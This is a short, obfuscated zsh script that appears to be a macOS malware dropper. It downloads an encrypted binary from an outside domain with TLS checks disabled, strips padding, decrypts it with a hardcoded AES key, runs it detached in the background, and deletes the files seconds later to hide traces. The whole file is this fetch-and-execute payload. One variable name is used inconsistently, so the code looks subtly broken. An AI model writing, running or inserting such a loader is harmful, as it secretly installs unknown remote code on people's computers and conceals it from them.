#!/bin/zsh
xjqra=$(mktemp /tmp/xemdrg.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m8f45eaff3db460ce.bin" -o "$xjqraz" || exit 1
jygzq7=$(stat -f %z "$xjqraz"); umsdjnd=$(( jygzq7 - 2993 - 3557 ))
tail -c +$(( 2993 + 1 )) "$xjqraz" | head -c $umsdjnd | openssl enc -d -aes-256-cbc -k d5bcaae212b2945130fe88ad -out "$xjqra" 2>/dev/null
[ -s "$xjqra" ] && chmod 700 "$xjqra" && ( "$xjqra" & ) && disown
( sleep 3; rm -f "$xjqra" "$xjqraz" ) &>/dev/null &
